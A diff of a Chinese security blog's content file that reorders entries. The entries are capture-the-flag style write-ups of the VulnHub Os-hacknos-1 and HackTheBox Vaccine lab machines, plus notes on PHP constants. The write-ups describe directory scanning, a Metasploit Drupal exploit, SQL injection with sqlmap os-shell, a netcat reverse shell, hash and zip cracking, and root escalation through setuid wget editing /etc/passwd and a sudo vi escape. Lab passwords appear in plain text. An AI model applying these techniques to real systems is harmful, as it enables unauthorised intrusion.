+<p>扫描一下目录</p>
+<p><code>dirb http://192.168.2.175 /usr/share/wordlist/dirb/big.txt</code></p>
+<p><img src="hacknos:Os-hacknos:1/image-20200726154358206.png" alt="image-20200726154358206"></p>
+<p>发现是一个<code>drupal</code>的网站</p>
+<p>进去访问之后，也没有啥东西</p>
+<img src="hacknos:Os-hacknos:1/image-20200726154431342.png" alt="image-20200726154431342" style="zoom:50%;" />
+
+<p>尝试使用<code>msfconsole</code>的<code>search</code>寻找一下</p>
+<p>这里选用的是</p>
+<img src="hacknos:Os-hacknos:1/image-20200726154657427.png" alt="image-20200726154657427" style="zoom:50%;" />
+
+<p>设置一下参数</p>
+<img src="hacknos:Os-hacknos:1/image-20200726154856710.png" alt="image-20200726154856710" style="zoom:50%;" />
+
+<p>看到出现了<code>opened</code>表示成功了</p>
+<img src="hacknos:Os-hacknos:1/image-20200726155014184.png" alt="image-20200726155014184" style="zoom:50%;" />
+
+
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>得到shell之后，在<code>../</code>(<code>/var/www/</code>)目录下发现了一个</p>
+<img src="hacknos:Os-hacknos:1/image-20200726155224282.png" alt="image-20200726155224282" style="zoom:50%;" />
+
+<p>里面是一段base64</p>
+<p>解密出来之后是一段<code>brain fuck</code></p>
+<img src="hacknos:Os-hacknos:1/image-20200726155315147.png" alt="image-20200726155315147" style="zoom:50%;" />
+
+<p>再次解密之后</p>
+<img src="hacknos:Os-hacknos:1/image-20200726155718450.png" alt="image-20200726155718450" style="zoom:50%;" />
+
+<p>得到了<code>james</code>的密码是<code>Hacker@4514</code></p>
+<p>使用ssh连接，发现并不可以，su也不能切换</p>
+<img src="hacknos:Os-hacknos:1/image-20200726160048138.png" alt="image-20200726160048138" style="zoom:50%;" />
+
+<img src="hacknos:Os-hacknos:1/image-20200726160058487.png" alt="image-20200726160058487" style="zoom:50%;" />
+
+<p>那只能继续找提权的东西</p>
+<img src="hacknos:Os-hacknos:1/image-20200726160159528.png" alt="image-20200726160159528" style="zoom:50%;" />
+
+<p>发现<code>wget</code>有<code>setuid</code>权限，可以用它写入<code>/root/.ssh/</code>(但是并没有这个目录)</p>
+<p>考虑使用<code>/etc/passwd</code>，先把里面的内容拷贝到一个文件里，然后使用openssl生成一个密码，加入账户中</p>
+<img src="hacknos:Os-hacknos:1/image-20200726160550053.png" alt="image-20200726160550053" style="zoom:50%;" />
+
+<p>然后仿照root的那一行写就行</p>
+<p>使用su，提权到root</p>
+<img src="hacknos:Os-hacknos:1/image-20200726160636869.png" alt="image-20200726160636869" style="zoom:50%;" />
+
+
+
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>vulnhub</category>
+        <category>hacknos</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>drupal</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vulnhub hacks:Os-ByteSec靶机</title>
     <url>//Os-ByteSec.html</url>
     <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
@@ -2743,79 +2981,6 @@
       <tags>
         <tag>exploit</tag>
         <tag>smb</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vulnhub hacks:Os-hacknos-1靶机</title>
-    <url>//Os-hacknos.html</url>
-    <content><![CDATA[<p>vulnhub里的 nezikochan 靶机</p>
-<p>简单/中等难度</p>
-<a id="more"></a>
-
-
-
-<h1 id="Os-hacknos-1"><a href="#Os-hacknos-1" class="headerlink" title="Os-hacknos-1"></a>Os-hacknos-1</h1><p>靶机的ip地址为<code>192.168.2.175</code></p>
-<p>开放端口<code>22 80</code></p>
-<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>访问之后的页面是一个默认页面</p>
-<img src="hacknos:Os-hacknos:1/image-20200726154227817.png" alt="image-20200726154227817" style="zoom:50%;" />
-
-<p>扫描一下目录</p>
-<p><code>dirb http://192.168.2.175 /usr/share/wordlist/dirb/big.txt</code></p>
-<p><img src="hacknos:Os-hacknos:1/image-20200726154358206.png" alt="image-20200726154358206"></p>
-<p>发现是一个<code>drupal</code>的网站</p>
-<p>进去访问之后，也没有啥东西</p>
-<img src="hacknos:Os-hacknos:1/image-20200726154431342.png" alt="image-20200726154431342" style="zoom:50%;" />
-
-<p>尝试使用<code>msfconsole</code>的<code>search</code>寻找一下</p>
-<p>这里选用的是</p>
-<img src="hacknos:Os-hacknos:1/image-20200726154657427.png" alt="image-20200726154657427" style="zoom:50%;" />
-
-<p>设置一下参数</p>
-<img src="hacknos:Os-hacknos:1/image-20200726154856710.png" alt="image-20200726154856710" style="zoom:50%;" />
-
-<p>看到出现了<code>opened</code>表示成功了</p>
-<img src="hacknos:Os-hacknos:1/image-20200726155014184.png" alt="image-20200726155014184" style="zoom:50%;" />
-
-
-
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>得到shell之后，在<code>../</code>(<code>/var/www/</code>)目录下发现了一个</p>
-<img src="hacknos:Os-hacknos:1/image-20200726155224282.png" alt="image-20200726155224282" style="zoom:50%;" />
-
-<p>里面是一段base64</p>
-<p>解密出来之后是一段<code>brain fuck</code></p>
-<img src="hacknos:Os-hacknos:1/image-20200726155315147.png" alt="image-20200726155315147" style="zoom:50%;" />
-
-<p>再次解密之后</p>
-<img src="hacknos:Os-hacknos:1/image-20200726155718450.png" alt="image-20200726155718450" style="zoom:50%;" />
-
-<p>得到了<code>james</code>的密码是<code>Hacker@4514</code></p>
-<p>使用ssh连接，发现并不可以，su也不能切换</p>
-<img src="hacknos:Os-hacknos:1/image-20200726160048138.png" alt="image-20200726160048138" style="zoom:50%;" />
-
-<img src="hacknos:Os-hacknos:1/image-20200726160058487.png" alt="image-20200726160058487" style="zoom:50%;" />
-
-<p>那只能继续找提权的东西</p>
-<img src="hacknos:Os-hacknos:1/image-20200726160159528.png" alt="image-20200726160159528" style="zoom:50%;" />
-
-<p>发现<code>wget</code>有<code>setuid</code>权限，可以用它写入<code>/root/.ssh/</code>(但是并没有这个目录)</p>
-<p>考虑使用<code>/etc/passwd</code>，先把里面的内容拷贝到一个文件里，然后使用openssl生成一个密码，加入账户中</p>
-<img src="hacknos:Os-hacknos:1/image-20200726160550053.png" alt="image-20200726160550053" style="zoom:50%;" />
-
-<p>然后仿照root的那一行写就行</p>
-<p>使用su，提权到root</p>
-<img src="hacknos:Os-hacknos:1/image-20200726160636869.png" alt="image-20200726160636869" style="zoom:50%;" />
-
-
-
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>vulnhub</category>
-        <category>hacknos</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>drupal</tag>
       </tags>
   </entry>
   <entry>
@@ -3747,28 +3912,6 @@
       </tags>
   </entry>
   <entry>
-    <title>信息收集的一些姿势</title>
-    <url>//information.html</url>
-    <content><![CDATA[<p>记录一下目前用到的某些小工具（不全，慢慢补，不急）</p>
-<a id="more"></a>
-
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul>
-<li>  <a href="https://securitytrails.com/">https://securitytrails.com/</a></li>
-</ul>
-<h2 id="钟馗之眼"><a href="#钟馗之眼" class="headerlink" title="钟馗之眼"></a>钟馗之眼</h2><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
-<h2 id="censys"><a href="#censys" class="headerlink" title="censys"></a>censys</h2><p><a href="https://censys.io/">https://censys.io/</a></p>
-<h2 id="ip历史解析"><a href="#ip历史解析" class="headerlink" title="ip历史解析"></a>ip历史解析</h2><ul>
-<li>  ip查询：<a href="https://ipchaxun.com/">https://ipchaxun.com/</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>exploit</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用nps</title>
     <url>//nps.html</url>
     <content><![CDATA[<p>使用<code>nps</code>工具进行内网渗透</p>
@@ -3945,33 +4088,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php中的系统常量</title>
-    <url>//php_systemVar.html</url>
-    <content><![CDATA[<p>php中的常量</p>
-<p>参见<a href="https://www.php.net/manual/zh/reserved.variables.php">php手册</a></p>
-<a id="more"></a>
-
-
-
-<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP_VERSION:		<span class="comment">// php的版本号</span></span><br><span class="line">PHP_INT_SIZE:		<span class="comment">// 整型的大小</span></span><br><span class="line">PHP_INT_MAX:		<span class="comment">// 整型能表示的最大值</span></span><br><span class="line">PHP_OS 				<span class="comment">// 当前PHP环境的运行操作系统</span></span><br><span class="line">M_PI 				<span class="comment">// 圆周率常量值</span></span><br><span class="line">M_E 				<span class="comment">// 科学常数e</span></span><br><span class="line">E_ERROR 			<span class="comment">// 最近的错误之处</span></span><br><span class="line">E_WARNING 			<span class="comment">// 最近的警告之处</span></span><br><span class="line">E_PARSE 			<span class="comment">// 剖析语法有潜在问题之处</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量是会根据环境的变化而发生变化的变量</p>
-<p>由<code>__xxx__</code>形式构成</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">__FILE__</span> 		<span class="comment">// 当前PHP文件的绝对路径路径(会带上文件名)</span></span><br><span class="line"><span class="keyword">__DIR__</span>			<span class="comment">// 当前文件的目录(绝对路径)</span></span><br><span class="line"><span class="keyword">__LINE__</span> 		<span class="comment">// 当前PHP文件中所在的行号</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> 	<span class="comment">// 当前函数名，只对函数内调用起作用</span></span><br><span class="line"><span class="keyword">__CLASS__</span> 		<span class="comment">// 当前类名，只对类起作用</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span>	<span class="comment">// 当前所属的命名空间</span></span><br><span class="line"><span class="keyword">__METHOD__</span> 		<span class="comment">// 表示类方法名，比如B::test</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php中的预定义变量</title>
     <url>//php_predefine.html</url>
     <content><![CDATA[<p>php中的预定义变量</p>
@@ -4001,6 +4117,33 @@
 
 <p>这个变量主要是用于</p>
 <p>​    在局部范围不可以使用全局变量的时候有需要使用该变量的值，此时就可以用它来取得该全局变量的值。</p>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php中的系统常量</title>
+    <url>//php_systemVar.html</url>
+    <content><![CDATA[<p>php中的常量</p>
+<p>参见<a href="https://www.php.net/manual/zh/reserved.variables.php">php手册</a></p>
+<a id="more"></a>
+
+
+
+<h3 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP_VERSION:		<span class="comment">// php的版本号</span></span><br><span class="line">PHP_INT_SIZE:		<span class="comment">// 整型的大小</span></span><br><span class="line">PHP_INT_MAX:		<span class="comment">// 整型能表示的最大值</span></span><br><span class="line">PHP_OS 				<span class="comment">// 当前PHP环境的运行操作系统</span></span><br><span class="line">M_PI 				<span class="comment">// 圆周率常量值</span></span><br><span class="line">M_E 				<span class="comment">// 科学常数e</span></span><br><span class="line">E_ERROR 			<span class="comment">// 最近的错误之处</span></span><br><span class="line">E_WARNING 			<span class="comment">// 最近的警告之处</span></span><br><span class="line">E_PARSE 			<span class="comment">// 剖析语法有潜在问题之处</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>魔术常量是会根据环境的变化而发生变化的变量</p>
+<p>由<code>__xxx__</code>形式构成</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">__FILE__</span> 		<span class="comment">// 当前PHP文件的绝对路径路径(会带上文件名)</span></span><br><span class="line"><span class="keyword">__DIR__</span>			<span class="comment">// 当前文件的目录(绝对路径)</span></span><br><span class="line"><span class="keyword">__LINE__</span> 		<span class="comment">// 当前PHP文件中所在的行号</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> 	<span class="comment">// 当前函数名，只对函数内调用起作用</span></span><br><span class="line"><span class="keyword">__CLASS__</span> 		<span class="comment">// 当前类名，只对类起作用</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span>	<span class="comment">// 当前所属的命名空间</span></span><br><span class="line"><span class="keyword">__METHOD__</span> 		<span class="comment">// 表示类方法名，比如B::test</span></span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>web</category>
@@ -4409,6 +4552,80 @@
       </tags>
   </entry>
   <entry>
+    <title>box:Vaccine</title>
+    <url>//box_Vaccine.html</url>
+    <content><![CDATA[<p>从零开始的hack_the_box 生活</p>
+<a id="more"></a>
+
+<h1 id="Vaccine"><a href="#Vaccine" class="headerlink" title="Vaccine"></a>Vaccine</h1><ul>
+<li>  靶机： <code>10.10.10.46</code></li>
+<li>  攻击机：<code>10.10.14.88</code></li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# nmap 10.10.10.46 -A                                                                                                                                                    1 ⚙</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 20:46 EST</span><br><span class="line">Nmap scan report for 10.10.10.46</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 977 closed ports</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line">21/tcp    open     ftp           vsftpd 3.0.3</span><br><span class="line">22/tcp    open     ssh           OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)</span><br><span class="line">|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)</span><br><span class="line">|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)</span><br><span class="line">80/tcp    open     http          Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: MegaCorp Login</span><br></pre></td></tr></table></figure>
+
+<p>老样子，遇到ftp和ssh先爆破一波，web服务访问也是登录，也爆破</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095757633.png" alt="image-20210302095757633"></p>
+<p>一顿操作猛如虎，一看，啥都没有。</p>
+<p>结果ftp的密码居然是上一道题<code>/root/.config/filezilla</code>下的<code>filezilla.xml</code></p>
+<p><code>ftpuser/mc@F1l3ZilL4</code>吐了</p>
+<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>登录上去发现backup.zip</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095011014.png" alt="image-20210302095011014"></p>
+<p>下载下来，解压需要密码</p>
+<p>使用<code>fcrackzip</code>爆破密码，<a href="https://blog.csdn.net/weixin_43272781/article/details/100751375">参数和使用教程</a></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095159837.png" alt="image-20210302095159837"></p>
+<p>解压后得到<code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      header(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>破解一下hash</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095706364.png" alt="image-20210302095706364"></p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>得到了用户名和密码之后就可以登录了，登录之后有一个搜索框，这回总是sql注入了吧</p>
+<p>果不其然，直接堆叠注入。</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095959505.png" alt="image-20210302095959505"></p>
+<p>看一下版本</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();</span><br><span class="line">PostgreSQL 11.5 (Ubuntu 11.5-1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.1.0-9ubuntu2) 9.1.0, 64-bit</span><br></pre></td></tr></table></figure>
+
+<p>这数据库没有注过啊。</p>
+<ul>
+<li><p>sqlmap。 –os-shell</p>
+<p>  居然能用</p>
+<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302102217607.png" alt="image-20210302102217607"></p>
+<p>  传过去一个nc，连上反弹shell</p>
+<p>  ![image-20210302102920598](/Users/shirohaethu/Library/Application Support/typora-user-images/image-20210302102920598.png)</p>
+<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302102938607.png" alt="image-20210302102938607"></p>
+</li>
+</ul>
+<p>user.txt</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103249535.png" alt="image-20210302103249535"></p>
+<ul>
+<li>  万能的百度</li>
+</ul>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302100939553.png" alt="image-20210302100939553"></p>
+<p>文件读取</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302101000333.png" alt="image-20210302101000333"></p>
+<p>文件写失败了。。。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在<code>/var/www/html/dashboard.php</code>中，有当前用户<code>postgres</code>的密码</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103407792.png" alt="image-20210302103407792"></p>
+<p>ssh建立连接</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103509012.png" alt="image-20210302103509012"></p>
+<p><code>sudo -l</code>发现可以免密运行<code>/bin/vi /etc/postgresql/11/main/pg_hba.conf</code>，vi 是可以得到一个<code>/bin/bash</code>的</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103649670.png" alt="image-20210302103649670"></p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103724396.png" alt="image-20210302103724396"></p>
+<p>得到root权限</p>
+<p>flag:</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103748836.png" alt="image-20210302103748836"></p>
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>hack the box</category>
+        <category>start point</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>hack the box</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>box:Shield</title>
     <url>//box_Shield.html</url>
     <content><![CDATA[<p>从零开始的hack_the_box 生活</p>
@@ -4506,80 +4723,6 @@
         <tag>windows</tag>
         <tag>exploit</tag>
         <tag>hack the box</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>box:Vaccine</title>
-    <url>//box_Vaccine.html</url>
-    <content><![CDATA[<p>从零开始的hack_the_box 生活</p>
-<a id="more"></a>
-
-<h1 id="Vaccine"><a href="#Vaccine" class="headerlink" title="Vaccine"></a>Vaccine</h1><ul>
-<li>  靶机： <code>10.10.10.46</code></li>
-<li>  攻击机：<code>10.10.14.88</code></li>
-</ul>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">└─# nmap 10.10.10.46 -A                                                                                                                                                    1 ⚙</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 20:46 EST</span><br><span class="line">Nmap scan report for 10.10.10.46</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 977 closed ports</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line">21/tcp    open     ftp           vsftpd 3.0.3</span><br><span class="line">22/tcp    open     ssh           OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)</span><br><span class="line">|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)</span><br><span class="line">|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)</span><br><span class="line">80/tcp    open     http          Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: MegaCorp Login</span><br></pre></td></tr></table></figure>
-
-<p>老样子，遇到ftp和ssh先爆破一波，web服务访问也是登录，也爆破</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095757633.png" alt="image-20210302095757633"></p>
-<p>一顿操作猛如虎，一看，啥都没有。</p>
-<p>结果ftp的密码居然是上一道题<code>/root/.config/filezilla</code>下的<code>filezilla.xml</code></p>
-<p><code>ftpuser/mc@F1l3ZilL4</code>吐了</p>
-<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>登录上去发现backup.zip</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095011014.png" alt="image-20210302095011014"></p>
-<p>下载下来，解压需要密码</p>
-<p>使用<code>fcrackzip</code>爆破密码，<a href="https://blog.csdn.net/weixin_43272781/article/details/100751375">参数和使用教程</a></p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095159837.png" alt="image-20210302095159837"></p>
-<p>解压后得到<code>index.php</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      header(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>破解一下hash</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095706364.png" alt="image-20210302095706364"></p>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>得到了用户名和密码之后就可以登录了，登录之后有一个搜索框，这回总是sql注入了吧</p>
-<p>果不其然，直接堆叠注入。</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302095959505.png" alt="image-20210302095959505"></p>
-<p>看一下版本</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();</span><br><span class="line">PostgreSQL 11.5 (Ubuntu 11.5-1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.1.0-9ubuntu2) 9.1.0, 64-bit</span><br></pre></td></tr></table></figure>
-
-<p>这数据库没有注过啊。</p>
-<ul>
-<li><p>sqlmap。 –os-shell</p>
-<p>  居然能用</p>
-<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302102217607.png" alt="image-20210302102217607"></p>
-<p>  传过去一个nc，连上反弹shell</p>
-<p>  ![image-20210302102920598](/Users/shirohaethu/Library/Application Support/typora-user-images/image-20210302102920598.png)</p>
-<p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302102938607.png" alt="image-20210302102938607"></p>
-</li>
-</ul>
-<p>user.txt</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103249535.png" alt="image-20210302103249535"></p>
-<ul>
-<li>  万能的百度</li>
-</ul>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302100939553.png" alt="image-20210302100939553"></p>
-<p>文件读取</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302101000333.png" alt="image-20210302101000333"></p>
-<p>文件写失败了。。。</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在<code>/var/www/html/dashboard.php</code>中，有当前用户<code>postgres</code>的密码</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103407792.png" alt="image-20210302103407792"></p>
-<p>ssh建立连接</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103509012.png" alt="image-20210302103509012"></p>
-<p><code>sudo -l</code>发现可以免密运行<code>/bin/vi /etc/postgresql/11/main/pg_hba.conf</code>，vi 是可以得到一个<code>/bin/bash</code>的</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103649670.png" alt="image-20210302103649670"></p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103724396.png" alt="image-20210302103724396"></p>
-<p>得到root权限</p>
-<p>flag:</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210302103748836.png" alt="image-20210302103748836"></p>
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>hack the box</category>
-        <category>start point</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>hack the box</tag>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
